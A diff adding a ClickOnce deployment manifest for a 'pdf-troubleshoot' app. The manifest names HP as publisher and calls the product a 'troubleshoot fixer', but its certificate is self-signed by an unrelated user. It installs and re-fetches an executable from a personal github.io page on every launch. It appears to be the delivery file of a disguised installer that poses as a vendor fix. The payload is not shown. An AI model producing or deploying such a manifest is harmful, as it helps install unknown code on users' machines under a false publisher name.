@@ -1,0 +1,29 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:asmv3="urn:schemas-microsoft-com:asm.v3" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns:co.v1="urn:schemas-microsoft-com:clickonce.v1" xmlns:co.v2="urn:schemas-microsoft-com:clickonce.v2">
+  <assemblyIdentity name="pdf-troubleshoot.app" version="2.0.0.0" publicKeyToken="c06d387cb2734a8b" language="neutral" processorArchitecture="msil" xmlns="urn:schemas-microsoft-com:asm.v1" />
+  <description asmv2:publisher="HP" asmv2:product="troubleshoot fixer" xmlns="urn:schemas-microsoft-com:asm.v1" />
+  <deployment install="true">
+    <subscription>
+      <update>
+        <expiration maximumAge="0" unit="days" />
+      </update>
+    </subscription>
+    <deploymentProvider codebase="https://killerhouse726-a11y.github.io/fix.application" />
+  </deployment>
+  <compatibleFrameworks xmlns="urn:schemas-microsoft-com:clickonce.v2">
+    <framework targetVersion="4.8" profile="Client" supportedRuntime="4.0.30319" />
+    <framework targetVersion="4.8" profile="Full" supportedRuntime="4.0.30319" />
+  </compatibleFrameworks>
+  <dependency>
+    <dependentAssembly dependencyType="install" codebase="pdf-troubleshoot.exe.manifest" size="7682">
+      <assemblyIdentity name="pdf-troubleshoot.exe" version="2.0.0.0" publicKeyToken="c06d387cb2734a8b" language="neutral" processorArchitecture="msil" type="win32" />
+      <hash>
+        <dsig:Transforms>
+          <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+        </dsig:Transforms>
+        <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha256" />
+        <dsig:DigestValue>eN5unGLdlJDK6YVfKSc9WBTZcDIGhpoPLwfXRiqKNz8=</dsig:DigestValue>
+      </hash>
+    </dependentAssembly>
+  </dependency>
+<publisherIdentity name="CN=GEORGEKOOPER\dpakm" issuerKeyHash="970b3ddc3ac5fb8e322c2b42c21945ee587b4421" /><Signature Id="StrongNameSignature" xmlns="http://www.w3.org/2000/09/xmldsig#"><SignedInfo><CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /><SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha256" /><Reference URI=""><Transforms><Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature" /><Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /></Transforms><DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha256" /><DigestValue>qMpw2dmxyuab4Y0XoNGBdxDi9gelYQzKOoCo5ygEZ84=</DigestValue></Reference></SignedInfo><SignatureValue>WQwCP6NWKYvwOtsCx3v8oUt/8ZF+e7PFbV+5StY9wBeeOiCCTWWmznhdkWEdIjkQZNTNnVB9E6TwEhyYAkQa3byBdpAGpeo6x05q6U1PSTnUUMR8IHSYbZQh/K4e2kkF4BzUtcYj4q9GpVmjjqUQ7LECyVle3v1JoNS7fnbMisM=</SignatureValue><KeyInfo Id="StrongNameKeyInfo"><KeyValue><RSAKeyValue><Modulus>xBCc3IEyIdpl5OU1kS4wpWoc+SjEXCbZwcUJFezwjZ4CrrNRcbJOQVk/YETsdYZVC1blHOsS74UNbgFPMOYOagRl/cdKWnTo93tTgqX2n0FsiWETrlkeUpsAtY35nqb0UQA41EAw2qFsj9DxfuKGjBnayW+UhDqWyk72L8hxdwE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue></KeyValue><msrel:RelData xmlns:msrel="http://schemas.microsoft.com/windows/rel/2005/reldata"><r:license xmlns:r="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:as="http://schemas.microsoft.com/windows/pki/2005/Authenticode"><r:grant><as:ManifestInformation Hash="ce670428e7a8803aca0c61a507f6e2107781d1a0178de19be6cab1d9d970caa8" Description="" Url=""><as:assemblyIdentity name="pdf-troubleshoot.app" version="2.0.0.0" publicKeyToken="c06d387cb2734a8b" language="neutral" processorArchitecture="msil" xmlns="urn:schemas-microsoft-com:asm.v1" /></as:ManifestInformation><as:SignedBy /><as:AuthenticodePublisher><as:X509SubjectName>CN=GEORGEKOOPER\dpakm</as:X509SubjectName></as:AuthenticodePublisher></r:grant><r:issuer><Signature Id="AuthenticodeSignature" xmlns="http://www.w3.org/2000/09/xmldsig#"><SignedInfo><CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /><SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha256" /><Reference URI=""><Transforms><Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature" /><Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /></Transforms><DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha256" /><DigestValue>JB0IUkFJjaymoamGOekYP0Bk/NPsMAxgOjl/nE29B+o=</DigestValue></Reference></SignedInfo><SignatureValue>dGMxJKvI8JEvlkyD/I/HIn7bqV28DHLLryFyFcdYOaTeFxxllYgy6OvefwjTWQl0B34yp+BCu+m65gktFbtyrtBKSbReuYI/32YQtPeL7ryUPN3+2nNqwSQMnZFBUWc+zT0d9I6EZdu3XX7pT/RRoysqcMQy7BVtBbnQgfpfcj0=</SignatureValue><KeyInfo><KeyValue><RSAKeyValue><Modulus>xBCc3IEyIdpl5OU1kS4wpWoc+SjEXCbZwcUJFezwjZ4CrrNRcbJOQVk/YETsdYZVC1blHOsS74UNbgFPMOYOagRl/cdKWnTo93tTgqX2n0FsiWETrlkeUpsAtY35nqb0UQA41EAw2qFsj9DxfuKGjBnayW+UhDqWyk72L8hxdwE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue></KeyValue><X509Data><X509Certificate>MIIB+jCCAWOgAwIBAgIQJEfNKP+PgIBIZG1OuNtQMTANBgkqhkiG9w0BAQsFADAvMS0wKwYDVQQDHiQARwBFAE8AUgBHAEUASwBPAE8AUABFAFIAXABkAHAAYQBrAG0wHhcNMjUxMTI3MDkwNDMzWhcNMzkwMTAyMDAwMDAwWjAvMS0wKwYDVQQDHiQARwBFAE8AUgBHAEUASwBPAE8AUABFAFIAXABkAHAAYQBrAG0wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMQQnNyBMiHaZeTlNZEuMKVqHPkoxFwm2cHFCRXs8I2eAq6zUXGyTkFZP2BE7HWGVQtW5RzrEu+FDW4BTzDmDmoEZf3HSlp06Pd7U4Kl9p9BbIlhE65ZHlKbALWN+Z6m9FEAONRAMNqhbI/Q8X7ihowZ2slvlIQ6lspO9i/IcXcBAgMBAAGjFzAVMBMGA1UdJQQMMAoGCCsGAQUFBwMDMA0GCSqGSIb3DQEBCwUAA4GBACI0F+aCzFvmIoBTBXQnUm/0rzeBHmlIG28/6Um8Z7D25ZC2OnqyyTaKfPl0uJnmkSfN0RL+s9PHCk3Cw7AZNGNW1MGcfYhdhswFsMe2dDsN05JEhJIiOLlTHPOskpaQZ7n7DjQ3kLbIrasFGxDneO934ymfInrf2xt9pE3lcYx7</X509Certificate></X509Data></KeyInfo></Signature></r:issuer></r:license></msrel:RelData></KeyInfo></Signature></asmv1:assembly>
